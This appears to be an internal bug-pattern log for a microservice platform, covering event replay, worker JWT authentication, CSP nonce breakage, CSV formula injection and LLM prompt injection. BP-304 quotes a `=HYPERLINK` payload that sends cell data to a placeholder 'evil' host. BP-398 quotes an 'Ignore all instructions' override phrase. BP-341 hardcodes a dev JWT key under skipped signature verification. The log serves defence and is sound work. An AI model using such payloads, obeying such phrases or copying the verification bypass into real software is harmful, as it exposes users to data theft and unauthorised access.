- When a service client swallows errors (`except ... return []`), add a counter metric (`s1_client_auth_failures_total`) so silent failures are observable in Grafana.

---

---

## BP-241 — Alert Dedup Keys Block Replay After Config Fix

| Field | Value |
|-------|-------|
| **Service** | alert (S10) — Valkey dedup pattern |
| **Severity** | LOW (operational — blocks manual testing; not production issue) |
| **Discovered** | 2026-04-27 live platform investigation |
| **Root cause** | `IntelligenceConsumer` marks each `event_id` in Valkey with a 24h TTL on first processing. When the consumer had 401 auth failures, it still marked events as processed (after calling `is_duplicate` → `mark_processed`). Resetting Kafka offsets to replay events doesn't clear the Valkey dedup state, so all replayed events are dropped as duplicates. |
| **Symptom** | After fixing S1Client auth and resetting Kafka offsets to `--to-earliest`, consumer shows LAG=0 but `alert_db.alerts` stays empty. No log entries. |
| **Fix** | When manually replaying events after a config fix: (1) stop consumer, (2) reset Kafka offsets, (3) delete Valkey dedup keys: `redis-cli EVAL "local k=redis.call('keys',ARGV[1]) if #k>0 then return redis.call('del',unpack(k)) end return 0" 0 "s10:dedup:*"`, (4) restart consumer. |

### Prevention

- Document the replay procedure in `docs/workflows/alert-replay.md`.
- Consider adding a `--reset-dedup` CLI flag to the consumer that clears its Valkey namespace before starting (dev mode only, guarded by `APP_ENV != production`).

---

## BP-258 — Service-to-Service Calls Bypass S9 Gateway: No RS256 Internal JWT Available

**Date discovered**: 2026-04-28
**Affected areas**: Portfolio brokerage-sync worker → market-data instrument resolution

**Pattern**:
A background worker (brokerage-sync) calls another microservice (market-data) directly (not via S9 gateway). All backend services require `X-Internal-JWT` (RS256 signed by S9). Background workers cannot obtain an RS256 JWT because they have no user session and no access to S9's private key.

**Root cause**:
Architecture assumes all backend-to-backend calls route through S9 gateway (which signs and attaches `X-Internal-JWT`). Background workers that call backends directly have no path to obtain a valid RS256 JWT.

**Fix (dev)**:
1. Enable `MARKET_DATA_INTERNAL_JWT_SKIP_VERIFICATION=true` in dev env. This env var is protected by a production guard.
2. Fix `InternalJWTMiddleware.dispatch()`: check `skip_verification` BEFORE the `if public_key is None:` block so that skip_verification=True bypasses ALL signature validation (not just the "no-public-key" fallback path).
3. Have the worker generate a static HS256 system JWT in `_system_jwt_headers()` and attach it to the httpx client.

**Fix (production)**:
Add a `POST /internal/v1/service-token` endpoint to S9 that accepts a pre-shared service credential and returns a short-lived RS256 JWT. Background workers exchange their service credential for an internal JWT at startup.

**Prevention**:
- Document which services make inter-service HTTP calls outside the S9 gateway path.
- Add integration test that verifies brokerage-sync can resolve instruments via market-data.
- Production deployment should never rely on `skip_verification=True`.

---

## BP-303 — Production OHLCV Auth Blackhole: Workers Rely on `dev-login`, Blocked in Prod

**Affected areas**: `services/nlp-pipeline/src/nlp_pipeline/infrastructure/http/market_data_client.py`; any future worker that calls another internal service guarded by `InternalJWTMiddleware`.

**First seen**: 2026-05-01 (PLAN-0057 Wave E-1 strict QA — H-2).

**Symptoms**:
- A backend worker mints its `X-Internal-JWT` by calling `POST /v1/auth/dev-login` against the API gateway.
- In **dev/demo** the worker is fully authenticated; downstream tables (`article_impact_windows`) populate as expected.
- In **production** the dev-login endpoint returns 403 (`app_env=production` guard in `services/api-gateway/src/api_gateway/routes/auth.py`). The worker swallows the error, logs `market_data_client_token_mint_failed`, and **falls back to unauthenticated requests** which the receiver rejects with 401. Net effect: the table stays empty forever and only a low-cadence WARN log signals the failure.

**Root Cause**:
Worker authentication assumes the dev-login flow is always available. Production correctly disables it (it's a developer tool), but no production-equivalent path was wired so the fallback "unauthenticated request" path silently masks the gap.

**Fix options** (Option 3 shipped):
1. Provision a per-service-account credential and let workers obtain a token via a new gateway endpoint (best — preserves the "S9 signs / others verify" model).
2. Mint a service JWT directly in the worker using the gateway's RSA private key (requires distributing the key — increases blast radius if compromised).
3. Add a `/internal/v1/service-token` endpoint protected by a shared service-account secret rotated via Kubernetes secrets.

**Resolution** (PLAN-0057 follow-up Wave A-1, 2026-05-01 — feat(wave-a-prod-hardening)):

Option 3 shipped. The implementation:
- New endpoint `POST /internal/v1/service-token` on S9 (`services/api-gateway/src/api_gateway/routes/internal.py`). Authenticates via shared `API_GATEWAY_SERVICE_ACCOUNT_TOKEN` secret + an explicit allow-list of service identities (`_ALLOWED_SERVICE_NAMES`), constant-time comparison via `secrets.compare_digest`. Issues a 5-minute RS256 JWT with `sub="service:<name>"`, `tenant_id="system"`, `role="system"`. The endpoint is intentionally **not** guarded by `app_env=="production"` — the shared secret IS the auth boundary.
- New helper `issue_service_jwt` in `services/api-gateway/src/api_gateway/jwt_utils.py`.
- `MarketDataClient` (`services/nlp-pipeline/src/nlp_pipeline/infrastructure/http/market_data_client.py`) gained `service_account_token` and `service_name` constructor args. When the secret is set it calls the new endpoint; when unset it falls back to `POST /v1/auth/dev-login` for local-dev convenience. A 401 from the service-token endpoint does NOT cascade to dev-login (operators expect the new path to be authoritative).
- Worker entrypoint `services/nlp-pipeline/src/nlp_pipeline/workers/price_impact_labelling_worker.py` reads `settings.service_account_token` and passes it through.
- Settings + env-var documentation: `API_GATEWAY_SERVICE_ACCOUNT_TOKEN` (S9 side) and `NLP_PIPELINE_SERVICE_ACCOUNT_TOKEN` (worker side); both empty by default to keep dev workflows on dev-login.

**Prevention**:
- Any worker that calls a guarded internal service must be reviewed for "what happens in prod when dev-login is disabled?" before merging.
- Add an explicit check on startup: if `app_env=production` and the worker depends on dev-login, fail fast rather than degrade silently.
- Track this gap in PLAN telemetry — file a P1 ticket the moment the worker ships, not after the audit catches it.


---

---

## BP-304 — Spreadsheet Formula Injection (CWE-1236) in Client-Side TSV/CSV Serialisers

**Affected areas**: any frontend code that serialises rows to TSV/CSV for clipboard or file download. Originated in `apps/worldview-web/components/ui/data-table/data-table.tsx` (`rowsToTsv` / `rowsToCsv`); fixed by extracting to `apps/worldview-web/lib/format/csv-tsv.ts` with `sanitiseFormula`.

**First seen**: 2026-05-01 (PLAN-0059 Wave F QA iter-1, security agent finding).

**Symptoms**:
- A user-controlled string (e.g. portfolio name `=HYPERLINK("http://evil/?p="&A1,"click")`) flows verbatim into an exported CSV / TSV.
- Excel / Sheets / Numbers detect a leading `=`, `+`, `-`, `@`, `\t`, or `\r` as a formula and **execute it on open** — no warning. Same payload reaches the user's clipboard via `navigator.clipboard.writeText`, so simply copying selected rows into a spreadsheet propagates the attack.

**Root Cause**:
Naive cell escaping handles only the standard "quote if contains comma/quote/newline" rule (RFC 4180), but does not address the spreadsheet-specific behavior of leading-character formula execution.

**Fix**:
```ts
function sanitiseFormula(s: string): string {
  return /^[=+\-@\t\r]/.test(s) ? `'${s}` : s;
}
```
Apply uniformly to BOTH headers AND cell values across TSV and CSV. The single-quote prefix forces the spreadsheet to treat the cell as a string. Add a test that verifies `=HYPERLINK(...)` does NOT lead the rendered output line.

**Prevention**:
- Centralise TSV/CSV serialisation in one library (`lib/format/csv-tsv.ts`) so the sanitisation rule has one home.
- ESLint rule banning ad-hoc CSV/TSV string concatenation in components — they MUST go through the canonical helpers.
- When any code touches clipboard/download/export of user-controllable data, run a CWE-1236 review.

---

---

## BP-323 — CSP `style-src` Missing Nonce Silently Blocks All Stylesheets (Safari + Next.js 15 nonce middleware)

**Category**: Security / Config
**Severity**: HIGH (entire page renders as unstyled plain HTML — looks like a broken build)
**First seen**: 2026-05-03
**Services**: worldview-web (frontend)

**Symptoms**:
- Page renders correct content but completely unstyled: white background, default fonts, bullet-point nav lists
- CSS files return HTTP 200 with valid Tailwind content via `curl`; the issue is browser-only
- Consistent in Safari; Chrome is more lenient and may allow stylesheets anyway
- Browser console: `Refused to load stylesheet ... violates Content-Security-Policy: "style-src 'self' 'unsafe-inline'"`

**Root cause**:
Next.js 15 App Router automatically adds a `nonce="N"` attribute to every `<link rel="stylesheet">` element when the middleware sets the `x-nonce` request header. Safari (and strict Chrome) require `style-src` to contain a matching `'nonce-N'` source when the element carries a nonce attribute — they do **NOT** fall through to `'self'` as a fallback when a nonce is present. Result: ALL stylesheets are blocked and the page is completely unstyled.

**Example**:
```typescript
// Bad — style-src missing nonce; Safari blocks all <link nonce="..."> stylesheets
`style-src 'self' 'unsafe-inline'`

// Good — nonce in BOTH script-src and style-src
`style-src 'self' 'unsafe-inline' 'nonce-${nonce}'`
```

**Fix applied**: `apps/worldview-web/middleware.ts` — added `'nonce-${nonce}'` to the `style-src` directive.

**Prevention**:
- Whenever Next.js uses nonce-based CSP (sets `x-nonce` in middleware), include the nonce in **both** `script-src` AND `style-src`
- "Style nonce is a follow-up" is NOT safe — it breaks Safari from day one silently
- Add to security audit checklist: verify `style-src` nonce parity with `script-src` when nonce middleware is present

---

---

## BP-325 — `'strict-dynamic'` in CSP `script-src` Blocks All Scripts on Next.js Prerendered Pages

**Category**: Next.js CSP / prerendering incompatibility
**Severity**: CRITICAL — full JS failure on every prerendered page
**Affected areas**: `apps/worldview-web/middleware.ts`; any nonce-based CSP middleware on a Next.js app using SSG or ISR

**Symptoms**:
- Page renders visually (CSS loads) but has zero interactivity
- React never hydrates — client components stay as their Suspense fallback (spinner)
- DevTools Console shows CSP violation: "Refused to execute script ... because 'strict-dynamic' ..."
- Only affects pages with `x-nextjs-cache: HIT` or `Cache-Control: s-maxage=...` (prerendered)
- Dynamically-rendered pages (SSR, `Cache-Control: no-store`) work fine

**Root cause**:
The CSP3 spec for `'strict-dynamic'` explicitly disables all host-based allowlists including `'self'` when present in `script-src`. Only scripts with a matching nonce or those dynamically created by an already-trusted script are allowed.

Next.js prerenderers (SSG/ISR) generate and cache HTML at build time. No per-request nonce exists at build time, so the prerendered HTML has **no nonce attributes** on any `<script>` tag. At request time, the middleware generates a fresh nonce and injects it into the `Content-Security-Policy` response header — but the cached HTML still has nonce-less scripts.

With `'strict-dynamic'` in effect:
- `'self'` is disabled → `/_next/static/*.js` chunks can't execute
- No nonced root script exists → no trust propagation
- Result: **every script on the page is blocked**

```typescript
// Bad — 'strict-dynamic' disables 'self'; prerendered pages have no nonces
`script-src 'self' 'nonce-${nonce}' 'strict-dynamic' 'unsafe-eval'`,

// Good — remove 'strict-dynamic' so 'self' honours same-origin chunks
`script-src 'self' 'nonce-${nonce}' 'unsafe-eval'`,
```

**Verification**:
```bash
curl -s -I http://localhost:3001/login | grep x-nextjs-cache
# x-nextjs-cache: HIT  ← prerendered page — won't have nonce attributes

curl -s http://localhost:3001/login | grep '<script' | head -5
# <script src="/_next/static/chunks/...js" async=""></script>  ← NO nonce!
# vs. SSR pages: nonce="AbCdEf==" present on every script tag
```

**Fix applied** (`apps/worldview-web/middleware.ts`):
Removed `'strict-dynamic'` from `script-src`. Security impact is minimal:
- `'self'` covers all legitimate Next.js chunks (same-origin)
- `'unsafe-inline'` is still absent → raw inline XSS scripts are still blocked
- `'nonce-${nonce}'` remains, authorising the inline RSC flight-payload scripts
  that Next.js emits on dynamically-rendered pages (those DO have nonces)
- External-domain script injection is still blocked (no wildcard hosts)

**Prevention**:
- NEVER combine `'strict-dynamic'` with a nonce-based CSP middleware in a Next.js app unless EVERY page is forced to dynamic rendering (`export const dynamic = 'force-dynamic'`)
- If `'strict-dynamic'` is required for a hardened deployment, add `export const dynamic = 'force-dynamic'` to every page/layout that must use nonces; otherwise omit `'strict-dynamic'`
- Add to CI: assert `'strict-dynamic'` absent in `Content-Security-Policy` response header
- Test file: `apps/worldview-web/__tests__/middleware-csp.test.ts`

---

## BP-341: Scheduler workers call internal services without X-Internal-JWT → 401 on all requests

**Date discovered**: 2026-05-03
**Service affected**: `knowledge-graph` (FundamentalsRefreshWorker), potentially any scheduler-only process

**Category**: Auth & Security
**Severity**: HIGH (worker silently skips all entities, no fundamentals embeddings produced)

### Symptom

- `fundamentals_refresh_market_data_unavailable` logged for every ticker entity
- Prior to instrument_id fix: `earnings_fetch_error status_code=401` for every call
- Worker reports `refreshed=0 earnings_events_inserted=0 relations_upserted=0`
- Market-data service logs: `InternalJWTMiddleware: missing Authorization header`

### Root Cause

The `FundamentalsRefreshWorker` creates a bare `httpx.AsyncClient` with no headers. All backend services behind `InternalJWTMiddleware` (market-data, content-store, etc.) require `X-Internal-JWT` in the request header. Scheduler processes have no framework-provided JWT injection — they must generate system JWTs explicitly.

In dev, `MARKET_DATA_INTERNAL_JWT_SKIP_VERIFICATION=true` means any HS256 JWT is accepted (no signature verification). The fix is to generate a minimal HS256 JWT at client construction time.

### Fix

```python
# At module level in the worker
import jwt, time

_INTERNAL_JWT_DEV_KEY = "dev-skip-verification-key-for-kg-fundamentals"  # noqa: S105

def _system_jwt_headers() -> dict[str, str]:
    now = int(time.time())
    token = jwt.encode(
        {"iss": "worldview-gateway", "sub": "system:kg-fundamentals-refresh",
         "user_id": "00000000-0000-0000-0000-000000000000",
         "tenant_id": "00000000-0000-0000-0000-000000000000",
         "role": "system", "iat": now, "exp": now + 86400},
        _INTERNAL_JWT_DEV_KEY, algorithm="HS256",
    )
    return {"X-Internal-JWT": token}

# In worker.run():
http = self._http or _httpx.AsyncClient(timeout=15.0, headers=_system_jwt_headers())
```

### Prevention

- Any scheduler worker that calls an internal service MUST generate a system JWT — check for `X-Internal-JWT` in the client construction
- Reference pattern: `services/portfolio/src/portfolio/workers/brokerage_sync_worker.py` `_system_jwt_headers()`
- For production: the signing key should come from settings (not hardcoded) and `SKIP_VERIFICATION=false`

**Regression test**: `tests/unit/infrastructure/workers/test_fundamentals_refresh_worker.py::TestFundamentalsRefreshWorkerS3Failure::test_successful_fetch_calls_upsert`

---

---

## BP-382 — Next.js full-route cache + per-request nonce = Safari stylesheet block

**Category**: Auth & Security / Frontend
**Severity**: HIGH (entire app renders unstyled on Safari and strict-CSP Chrome when cache is hit)
**First seen**: 2026-05-04
**Services**: worldview-web (middleware.ts + app/layout.tsx)

**Symptoms**:
- Safari (and Chrome with strict CSP) logs: `Refused to apply a stylesheet because its hash, its nonce, or 'unsafe-inline' does not appear in the style-src directive`
- Page text is visible but completely unstyled (Tailwind CSS not applied)
- Errors appear on dashboard, portfolio, and instrument detail pages
- The error fires on every page load after the first (cache-warm requests)
- `curl -I http://localhost:3001/ | grep x-nextjs-cache` shows `HIT`

**Root cause**:
`middleware.ts` generates a fresh nonce on every HTTP request and:
1. Sets it in the CSP response header (`nonce-<N>`)
2. Forwards it via `x-nonce` request header so Next.js embeds `nonce="<N>"` on every `<link rel="stylesheet">` and inline `<script>`

When Next.js's full-route cache serves a cached HTML shell, the `<link>` elements carry the **old nonce** (`nonce="A"`) from when the page was first rendered. But the middleware generates a **new nonce** (`nonce="B"`) for the current request's CSP header.

Per the CSP spec: when a `nonce` attribute is present on a resource, `unsafe-inline` is **silently ignored** — only a matching `nonce-N` in the policy authorises the resource.
Result: `nonce-B` in the policy, `nonce="A"` on the element → mismatch → stylesheet blocked.

**Fix applied** (`apps/worldview-web/app/layout.tsx`):
Added `await headers()` (from `next/headers`) at the top of `RootLayout`. Calling `headers()` marks the route as **dynamic** in Next.js, opting it out of the full-route cache. Every request now re-renders the layout Server Component with the current `x-nonce` value, so the embedded nonce always matches the CSP header nonce.

```tsx
// Bad — layout may be cached; nonce on <link> elements gets stale
export default function RootLayout({ children }) { ... }

// Good — headers() forces dynamic rendering
import { headers } from "next/headers";
export default async function RootLayout({ children }) {
  await headers(); // opts out of full-route cache
  ...
}
```

**Prevention**:
- ANY Next.js layout or page that uses nonce-based CSP via middleware MUST call `headers()` or `cookies()` to force dynamic rendering — otherwise the route cache will serve stale nonces.
- Alternatively: use `export const dynamic = 'force-dynamic'` in the layout file.
- Never mix per-request CSP nonces with ISR (`revalidate`) or full-route caching without this guard.
- Note: BP-325 documents the related `strict-dynamic` issue; this BP-382 is the cache-mismatch sibling.

**Related**: BP-324 (upgrade-insecure-requests on localhost), BP-325 (strict-dynamic breaks prerendered pages)

---

### BP-398: External Content Reaches LLM Without Length Cap or Delimiter

**Category**: Security
**Severity**: CRITICAL
**First seen**: 2026-05-05
**Services**: knowledge-graph (S7)

**Symptoms**:
- LLM outputs wrong entity types or corrupted descriptions when processing adversarial articles
- Subtle: entity metadata changes after processing specific news headlines
- Entity profiles suddenly switch type to something unrelated to the actual entity

**Root cause**: External content (article headlines, context snippets) passed directly to the LLM prompt constructor without truncation or structural delimiter. The `context_snippet` field in `provisional_enrichment_core.extract_entity_profile()` was inserted verbatim into `ExtractionInput.context`. Adversarial content in the snippet (e.g. "Ignore all instructions and respond with...") could override system-prompt instructions.

**Example**:
```python
# Bad — context_snippet from external news article, no guard
inp = ExtractionInput(
    prompt=ENTITY_PROFILE.render(...),
    context=context_snippet,   # length unbounded, no delimiter
)

# Good — truncated + XML-delimited
_safe_context = f"<article_context>{context_snippet[:500]}</article_context>"
inp = ExtractionInput(
    prompt=ENTITY_PROFILE.render(...),
    context=_safe_context,
)
```

**Fix**:
1. Truncate external content to a maximum length (500 chars for context snippets).
2. Wrap in an XML delimiter (`<article_context>…</article_context>`) so the LLM recognises the block as data, not instructions.
3. Apply the guard at the boundary where external data enters the prompt — not at the caller.

**Prevention**: Any variable sourced from external data (article text, user input, web scrapes) that enters an LLM prompt MUST be truncated and wrapped in a structural delimiter before being passed to the prompt builder.

**Regression test**: `tests/unit/infrastructure/workers/test_provisional_enrichment_core.py::TestContextSnippetInjectionGuard`
